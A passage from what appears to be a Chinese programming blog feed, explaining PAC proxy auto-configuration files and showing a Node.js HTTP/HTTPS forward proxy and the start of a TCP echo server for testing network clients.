href="#PAC" class="headerlink" title="PAC"></a>PAC</h3><p>现代浏览器几乎都支持 Proxy Auto-Configuration （PAC），这个可以让我们更灵活的使用代理。比如公司网站使用代理其它网站不走代理，有了PAC这都可以做到。PAC是一个JavaScript文件，MIME为<code>application/x-ns-proxy-autoconfig</code>。每个PAC文件必须有一个名为<code>FindProxyForURL(url,host)</code>的函数，用来计算访问URI时使用的代理服务器。函数返回值格式如下表：</p><table><thead><tr><th>FindProxyForURL的返回值</th><th>描　　述</th></tr></thead><tbody><tr><td>DIRECT</td><td>不经过任何代理，直接进行连接</td></tr><tr><td>PROXY host:port</td><td>应该使用指定的代理</td></tr><tr><td>SOCKS host:port</td><td>应该使用指定的 SOCKS 服务器</td></tr></tbody></table><p>示例：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Proxy Auto-Configuration (PAC) file</span></span><br><span class="line"><span class="keyword">var</span> proxy = <span class="string">&quot;PROXY proxy.kekek.cc:1337; DIRECT;&quot;</span>;</span><br><span class="line"><span class="keyword">var</span> direct = <span class="string">&#x27;DIRECT;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">FindProxyForURL</span>(<span class="params">url, host</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="regexp">/\.google\.com$/</span>.<span class="title function_">test</span>(host)) &#123;</span><br><span class="line">        <span class="keyword">return</span> proxy;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> direct;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以使用<a href="https://github.com/manugarg/pacparser">pacparser</a>来测试我们的PAC文件。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">brew install pacparser</span><br></pre></td></tr></table></figure><h3 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h3><p><a href="https://github.com/tianyk/http-proxy">GitHub</a></p><figure class="highlight javascript"><figcaption><span>proxy.js</span><a href="/downloads/code/autogeneration/proxy.js">view raw</a></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 2018-08-24 17:20:00</span></span><br><span class="line"><span class="keyword">const</span> http = <span class="built_in">require</span>(<span class="string">&#x27;http&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> net = <span class="built_in">require</span>(<span class="string">&#x27;net&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> url = <span class="built_in">require</span>(<span class="string">&#x27;url&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">PORT</span> = process.<span class="property">env</span>.<span class="property">PORT</span> || <span class="number">1337</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">HOST</span> = process.<span class="property">env</span>.<span class="property">HOST</span> || <span class="string">&#x27;127.0.0.1&#x27;</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">MY_IP</span> = <span class="string">&#x27;0.0.0.0&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">SERVER_TIMEOUT</span> = <span class="number">2</span> * <span class="number">60</span> * <span class="number">1000</span>; <span class="comment">// 2mins</span></span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">SEND_TIMEOUT</span>  = <span class="number">1000</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">PROXY_TIMEOUT</span> = <span class="number">60</span> * <span class="number">1000</span>; <span class="comment">// 1mins</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建一个 HTTP 代理服务器</span></span><br><span class="line"><span class="keyword">const</span> proxy = http.<span class="title function_">createServer</span>();</span><br><span class="line"></span><br><span class="line">proxy.<span class="title function_">on</span>(<span class="string">&#x27;request&#x27;</span>, <span class="function">(<span class="params">cReq, cRes</span>) =&gt;</span> {</span><br><span class="line">    <span class="keyword">const</span> cUrl = cReq.<span class="property">url</span>;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(cUrl);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 代理模式</span></span><br><span class="line">    <span class="keyword">if</span> (cUrl.<span class="title function_">startsWith</span>(<span class="string">&#x27;http&#x27;</span>)) {</span><br><span class="line">        <span class="keyword">const</span> { method, headers } = cReq;</span><br><span class="line">        <span class="keyword">const</span> { hostname, port = <span class="number">80</span>, path } = url.<span class="title function_">parse</span>(cReq.<span class="property">url</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// via</span></span><br><span class="line">        <span class="keyword">let</span> via = headers[<span class="string">&#x27;via&#x27;</span>];</span><br><span class="line">        <span class="keyword">if</span> (via) {</span><br><span class="line">            via = via += <span class="string">&#x27;, 1.1 proxy.kekek.cc (KEKE-Proxy)&#x27;</span>;</span><br><span class="line">        } <span class="keyword">else</span> {</span><br><span class="line">            via = <span class="string">&#x27;1.1 proxy.kekek.cc (KEKE-Proxy)&#x27;</span>;</span><br><span class="line">        }</span><br><span class="line">        headers[<span class="string">&#x27;via&#x27;</span>] = via;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// x-forward-for</span></span><br><span class="line">        <span class="keyword">let</span> ips = headers[<span class="string">&#x27;x-forward-for&#x27;</span>];</span><br><span class="line">        <span class="keyword">if</span> (ips) {</span><br><span class="line">            ips += <span class="string">`, <span class="subst">${MY_IP}</span>`</span>;</span><br><span class="line">        } <span class="keyword">else</span> {</span><br><span class="line">            ips = <span class="variable constant_">MY_IP</span>;</span><br><span class="line">        }</span><br><span class="line">        headers[<span class="string">&#x27;x-forward-for&#x27;</span>] = ips;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// Max-Forwards</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 服务器响应超时</span></span><br><span class="line">        <span class="comment">// cRes.setTimeout(SEND_TIMEOUT, () =&gt; {</span></span><br><span class="line">        <span class="comment">//     cRes.writeHead(504, { &#x27;content-type&#x27;: &#x27;text/plain&#x27; });</span></span><br><span class="line">        <span class="comment">//     cRes.end(&#x27;Send Timeout&#x27;);</span></span><br><span class="line">        <span class="comment">// });</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// &lt;http.ClientRequest&gt;</span></span><br><span class="line">        <span class="keyword">const</span> pReq = http.<span class="title function_">request</span>({ hostname, port, path, method, headers });</span><br><span class="line">        pReq</span><br><span class="line">            .<span class="built_in">setTimeout</span>(<span class="variable constant_">PROXY_TIMEOUT</span>)</span><br><span class="line">            .<span class="title function_">on</span>(<span class="string">&#x27;response&#x27;</span>, <span class="function">(<span class="params">pRes</span>) =&gt;</span> {</span><br><span class="line">                <span class="comment">// &lt;http.IncomingMessage&gt;</span></span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`[response] [proxy] <span class="subst">${cUrl}</span>`</span>);</span><br><span class="line"></span><br><span class="line">                cRes.<span class="title function_">writeHead</span>(pRes.<span class="property">statusCode</span>, pRes.<span class="property">headers</span>);</span><br><span class="line">                pRes.<span class="title function_">pipe</span>(cRes);</span><br><span class="line">            })</span><br><span class="line">            .<span class="title function_">on</span>(<span class="string">&#x27;timeout&#x27;</span>, <span class="function">() =&gt;</span> {</span><br><span class="line">                <span class="comment">// 代理请求超时</span></span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`[timeout] [proxy-req] <span class="subst">${cUrl}</span>`</span>);</span><br><span class="line">                pReq.<span class="title function_">abort</span>();</span><br><span class="line">            })</span><br><span class="line">            .<span class="title function_">on</span>(<span class="string">&#x27;abort&#x27;</span>, <span class="function">() =&gt;</span> {</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`[abort] [proxy-req] <span class="subst">${cUrl}</span>`</span>);</span><br><span class="line">            })</span><br><span class="line">            .<span class="title function_">on</span>(<span class="string">&#x27;close&#x27;</span>, <span class="function">() =&gt;</span> {</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`[close] [proxy-req] <span class="subst">${cUrl}</span>`</span>);</span><br><span class="line">            })</span><br><span class="line">            .<span class="title function_">on</span>(<span class="string">&#x27;error&#x27;</span>, <span class="function">(<span class="params">err</span>) =&gt;</span> {</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`[error] [proxy-req] <span class="subst">${cUrl}</span> \r\n<span class="subst">${err.stack}</span>`</span>);</span><br><span class="line">                cRes.<span class="title function_">writeHead</span>(<span class="number">500</span>, { <span class="string">&#x27;content-type&#x27;</span>: <span class="string">&#x27;text/plain&#x27;</span> });</span><br><span class="line">                cRes.<span class="title function_">end</span>(<span class="string">`Proxy Error: <span class="subst">${err.code || err.message || err.name}</span>`</span>);</span><br><span class="line">            });</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 请求重定向</span></span><br><span class="line">        cReq.<span class="title function_">pipe</span>(pReq);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 客户端中止</span></span><br><span class="line">        cReq.<span class="title function_">on</span>(<span class="string">&#x27;aborted&#x27;</span>, <span class="function">() =&gt;</span> {</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`[aborted] [client] <span class="subst">${cUrl}</span>`</span>);</span><br><span class="line">            <span class="comment">// 中止代理</span></span><br><span class="line">            pReq.<span class="title function_">abort</span>();</span><br><span class="line">        });</span><br><span class="line">    } <span class="keyword">else</span> {</span><br><span class="line">        <span class="comment">// http-server</span></span><br><span class="line">        <span class="keyword">if</span> (cUrl === <span class="string">&#x27;/proxy.pac&#x27;</span>) {</span><br><span class="line">            cRes.<span class="title function_">setHeader</span>(<span class="string">&#x27;content-type&#x27;</span>, <span class="string">&#x27;application/x-ns-proxy-autoconfig&#x27;</span>);</span><br><span class="line">            <span class="keyword">const</span> pac = <span class="string">`// Proxy Auto-Configuration (PAC) file</span></span><br><span class="line"><span class="string">// https://developer.mozilla.org/en-US/docs/Web/HTTP/Proxy_servers_and_tunneling/Proxy_Auto-Configuration_(PAC)_file</span></span><br><span class="line"><span class="string">// DIRECT        不经过任何代理，直接进行连接</span></span><br><span class="line"><span class="string">// PROXY host:port应该使用指定的代理</span></span><br><span class="line"><span class="string">// SOCKS host:port应该使用指定的 SOCKS 服务器</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">var proxy = &quot;PROXY proxy.kekek.cc:1337; DIRECT;&quot;;</span></span><br><span class="line"><span class="string">var direct = &#x27;DIRECT;&#x27;;</span></span><br><span class="line"><span class="string">function FindProxyForURL(url, host){</span></span><br><span class="line"><span class="string">    if (/\.\kekek\.cc$/.test(host)) {</span></span><br><span class="line"><span class="string">        return proxy;</span></span><br><span class="line"><span class="string">    } else {</span></span><br><span class="line"><span class="string">        return direct;</span></span><br><span class="line"><span class="string">    }</span></span><br><span class="line"><span class="string">}`</span>;</span><br><span class="line"></span><br><span class="line">            cRes.<span class="title function_">end</span>(pac);</span><br><span class="line">        } <span class="keyword">else</span> {</span><br><span class="line">            cRes.<span class="title function_">setHeader</span>(<span class="string">&#x27;content-type&#x27;</span>, <span class="string">&#x27;text/plain&#x27;</span>);</span><br><span class="line">            cRes.<span class="title function_">end</span>(<span class="string">&#x27;proxy: proxy.kekek.cc\r\nport: 1337\r\npac: http://proxy.kekek.cc:1337/proxy.pac&#x27;</span>);</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">});</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// https</span></span><br><span class="line">proxy.<span class="title function_">on</span>(<span class="string">&#x27;connect&#x27;</span>, <span class="function">(<span class="params">req, cltSocket, head</span>) =&gt;</span> {</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(req.<span class="property">url</span>, head.<span class="property">length</span>)</span><br><span class="line">    <span class="comment">// 连接到一个服务器</span></span><br><span class="line">    <span class="keyword">const</span> { port, hostname } = url.<span class="title function_">parse</span>(<span class="string">`http://<span class="subst">${req.url}</span>`</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> srvSocket = net.<span class="title function_">connect</span>(port, hostname);</span><br><span class="line"></span><br><span class="line">    srvSocket.<span class="title function_">on</span>(<span class="string">&#x27;connect&#x27;</span>, <span class="function">() =&gt;</span> {</span><br><span class="line">        cltSocket.<span class="title function_">write</span>(<span class="string">&#x27;HTTP/1.1 200 Connection Established\r\n&#x27;</span> +</span><br><span class="line">            <span class="string">&#x27;Proxy-agent: Node.js-Proxy\r\n&#x27;</span> +</span><br><span class="line">            <span class="string">&#x27;\r\n&#x27;</span>);</span><br><span class="line">        srvSocket.<span class="title function_">write</span>(head);</span><br><span class="line">        <span class="comment">// 连接管道</span></span><br><span class="line">        srvSocket.<span class="title function_">pipe</span>(cltSocket);</span><br><span class="line">        cltSocket.<span class="title function_">pipe</span>(srvSocket);</span><br><span class="line">    });</span><br><span class="line"></span><br><span class="line">    <span class="comment">// srvSocket.on(&#x27;end&#x27;, () =&gt; {</span></span><br><span class="line">    <span class="comment">//     // 远程服务器断开</span></span><br><span class="line">    <span class="comment">//     console.log(`[end] ${req.url}`);</span></span><br><span class="line">    <span class="comment">//     cltSocket.end();</span></span><br><span class="line">    <span class="comment">// });</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// srvSocket.on(&#x27;timeout&#x27;, () =&gt; {</span></span><br><span class="line">    <span class="comment">//     console.log(`[timeout] ${req.url}`);</span></span><br><span class="line">    <span class="comment">//     srvSocket.end();</span></span><br><span class="line">    <span class="comment">//     cltSocket.end();</span></span><br><span class="line">    <span class="comment">// });</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// srvSocket.on(&#x27;close&#x27;, (hasError) =&gt; {</span></span><br><span class="line">    <span class="comment">//     // 远程服务器完全断开</span></span><br><span class="line">    <span class="comment">//     console.log(`[close] ${req.url} ${hasError}`);</span></span><br><span class="line">    <span class="comment">// });</span></span><br><span class="line"></span><br><span class="line">    srvSocket.<span class="title function_">on</span>(<span class="string">&#x27;error&#x27;</span>, <span class="function">(<span class="params">err</span>) =&gt;</span> {</span><br><span class="line">        <span class="comment">// 远程服务器报错</span></span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`[error] <span class="subst">${req.url}</span> \r\n<span class="subst">${err.stack}</span>`</span>);</span><br><span class="line">        <span class="keyword">const</span> error = <span class="string">`Proxy Error: <span class="subst">${err.code || err.message || err.name}</span>`</span></span><br><span class="line">        cltSocket.<span class="title function_">end</span>(<span class="string">`HTTP/1.1 500 Internal Server Error\r\ncontent-type:text/plain\r\ncontent-length:<span class="subst">${err.length}</span>\r\n\r\n<span class="subst">${error}</span>`</span>);</span><br><span class="line">    });</span><br><span class="line">});</span><br><span class="line"></span><br><span class="line">proxy.<span class="title function_">on</span>(<span class="string">&#x27;listening&#x27;</span>, <span class="function">() =&gt;</span> {</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`Proxy-Server running on http://<span class="subst">${HOST}</span>:<span class="subst">${PORT}</span>`</span>);</span><br><span class="line">});</span><br><span class="line"></span><br><span class="line"><span class="comment">// 代理服务器正在运行</span></span><br><span class="line">proxy.<span class="title function_">listen</span>(<span class="variable constant_">PORT</span>, <span class="variable constant_">HOST</span>);</span><br></pre></td></tr></table></figure><h3 id="代码实现-1"><a href="#代码实现-1" class="headerlink" title="代码实现"></a>代码实现</h3><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><ul><li><a href="https://book.douban.com/subject/10746113/">HTTP权威指南-第六章 代理</a></li><li><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Proxy_servers_and_tunneling/Proxy_Auto-Configuration_(PAC)_file">Proxy Auto-Configuration (PAC) file</a></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> http </tag>
            
            <tag> proxy </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Echo服务</title>
      <link href="/post/echo-server.html"/>
      <url>/post/echo-server.html</url>
      
        <content type="html"><![CDATA[<h2 id="Echo服务"><a href="#Echo服务" class="headerlink" title="Echo服务"></a>Echo服务</h2><p>有些情况下调试网络客户端程序时会需要一个服务器配合测试，这时Echo服务就比较适合。它能充当一个Socket服务器，并且会把我们传过去的值返回来。</p><p>我们以<code>\n</code>或<code>\r\n</code>作为网络包的分隔符。</p><figure class="highlight javascript"><figcaption><span>echo.js</span><a href="/downloads/code/autogeneration/echo.js">view raw</a></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> net = <span class="built_in">require</span>(<span class="string">&#x27;net&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">PORT</span> = <span class="number">7000</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">HOST</span> = <span class="string">&#x27;0.0.0.0&#x27;</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">LF</span> = <span class="string">&#x27;\n&#x27;</span>.<span class="title function_">charCodeAt</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">CR</span> = <span class="string">&#x27;\r&#x27;</span>.<span class="title function_">charCodeAt</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">MAX_LENGTH</span> = <span class="number">128</span>; </span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">STRIP_DELIMITER</span> = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">findEndOfLine</span>(<span class="params">buffer</span>) {</span><br><span class="line">    <span class="keyword">let</span> i = buffer.<span class="title function_">indexOf</span>(<span class="variable constant_">LF</span>);</span><br><span class="line">    <span class="keyword">if</span> (i &gt; <span class="number">0</span> &amp;&amp; buffer[i - <span class="number">1</span>] === <span class="variable constant_">CR</span>) {</span><br><span class="line">        i--;</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">return</span> i;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">fail</span>(<span class="params">socket, length</span>) {</span><br><span class="line">    <span class="keyword">if</span> (socket.<span class="property">writable</span>) {</span><br><span class="line">        socket.<span class="title function_">end</span>(<span class="string">`frame length <span class="subst">${length}</span> exceeds the allowed maximum <span class="subst">${MAX_LENGTH}</span>`</span>);</span><br><span class="line">    } <span class="keyword">else</span> {</span><br><span class="line">        socket.<span class="title function_">end</span>();</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> server = net.<span class="title function_">createServer</span>();</span><br><span class="line"><span class="comment">// 最大连接数</span></span><br><span class="line">server.<span class="property">maxConnections</span> = <span class="number">10240</span>;</span><br><span class="line"></span><br><span class="line">server.<span class="title function_">on</span>(<span class="string">&#x27;connection&#x27;</span>, <span class="function">(<span class="params">socket</span>) =&gt;</span> {</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`新的客户端加入：<span class="subst">${socket.remoteAddress}</span>:<span class="subst">${socket.remotePort}</span>`</span>);</span><br><span class="line">    <span class="comment">// 设置编码 否则为Buffer</span></span><br><span class="line">    <span class="comment">// socket.setEncoding(&#x27;utf8&#x27;);</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 启用长连接，每100毫秒检测一次是否断开</span></span><br><span class="line">    <span class="comment">// socket.setKeepAlive(true, 100);</span></span><br><span class="line"></span><br><span class="line">    socket.<span class="built_in">setTimeout</span>(<span class="number">5000</span>); <span class="comment">// 5s</span></span><br><span class="line">    socket.<span class="title function_">on</span>(<span class="string">&#x27;timeout&#x27;</span>, <span class="function">() =&gt;</span> {</span><br><span class="line">        <span class="comment">// timeout并不会断开连接，需要手动断开</span></span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;超时断开&#x27;</span>);</span><br><span class="line">        socket.<span class="title function_">end</span>();</span><br><span class="line">    });</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 接收的字节数量（累计）</span></span><br><span class="line">    <span class="comment">// socket.bytesRead</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> readBuffer = <span class="title class_">Buffer</span>.<span class="title function_">alloc</span>(<span class="number">0</span>);</span><br><span class="line">    socket.<span class="title function_">on</span>(<span class="string">&#x27;data&#x27;</span>, <span class="function">(<span class="params">data</span>) =&gt;</span> {</span><br><span class="line">        readBuffer = <span class="title class_">Buffer</span>.<span class="title function_">concat</span>([readBuffer, data]);</span><br><span class="line">        <span class="keyword">const</span> eol = <span class="title function_">findEndOfLine</span>(readBuffer);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (eol &gt;= <span class="number">0</span>) {</span><br><span class="line">            <span class="keyword">let</span> frame;</span><br><span class="line">            <span class="keyword">const</span> delimLength = readBuffer[eol] === <span class="variable constant_">CR</span> ? <span class="number">2</span> : <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">const</span> length = eol + <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">if</span> (length &gt; <span class="variable constant_">MAX_LENGTH</span>) {</span><br><span class="line">                <span class="title function_">fail</span>(socket, length);</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            }</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (<span class="variable constant_">STRIP_DELIMITER</span>) {</span><br><span class="line">                frame = readBuffer.<span class="title function_">slice</span>(<span class="number">0</span>, eol);</span><br><span class="line">            } <span class="keyword">else</span> {</span><br><span class="line">                frame = readBuffer.<span class="title function_">slice</span>(<span class="number">0</span>, eol + delimLength);</span><br><span class="line">            }</span><br><span class="line">            readBuffer = readBuffer.<span class="title function_">slice</span>(eol + delimLength + <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (socket.<span class="property">writable</span>) socket.<span class="title function_">write</span>(frame);</span><br><span class="line">        } <span class="keyword">else</span> {</span><br><span class="line">            <span class="keyword">const</span> length = readBuffer.<span class="property">length</span>;</span><br><span class="line">            <span class="keyword">if</span> (length &gt; <span class="variable constant_">MAX_LENGTH</span>) {</span><br><span class="line">                <span class="title function_">fail</span>(socket, length);</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            }</span><br><span class="line">        }</span><br><span class="line">    });</span><br><span class="line"></span><br><span class="line">    socket.<span class="title function_">on</span>(<span class="string">&#x27;error&#x27;</span>, <span class="function">(<span class="params">err</span>) =&gt;</span> {</span><br><span class="line">        <span class="comment">// 当错误发生时触发。&#x27;close&#x27; 事件也会紧接着该事件被触发。</span></span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">`客户端错误：<span class="subst">${err.name}</span>\n<span class="subst">${err.stack}</span>`</span>);</span><br><span class="line">    });</span><br><span class="line"></span><br><span class="line">    socket.<span class="title function_">on</span>(<span class="string">&#x27;close&#x27;</span>, <span class="function">() =&gt;</span> {</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title 